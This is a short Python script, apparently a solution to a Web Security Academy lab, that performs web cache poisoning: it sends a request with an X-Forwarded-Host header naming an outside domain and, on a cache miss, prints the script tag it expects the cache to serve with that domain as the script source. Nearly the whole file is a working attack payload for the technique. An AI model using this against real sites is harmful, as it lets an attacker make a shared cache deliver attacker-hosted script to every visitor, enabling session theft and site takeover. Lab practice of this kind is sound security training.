import requests
from bs4 import BeautifulSoup

site = '0a75006c04216cd880770384008e0062.web-security-academy.net'
odin_id = 'calizo'

s = requests.Session()
site_url = f'https://{site}'
request_headers = {
   'X-Forwarded-Host': f'{odin_id}.net'
}
resp = s.get(site_url, headers=request_headers)

if resp.headers.get('X-Cache') == 'miss':
    soup = BeautifulSoup(resp.text, 'html.parser')
    script_src = soup.find('script')
    print(f'[+] Poisoned script tag is: {script_src}')
else:
    print(f'[-] Not a cache miss. X-Cache: {resp.headers.get("X-Cache")}')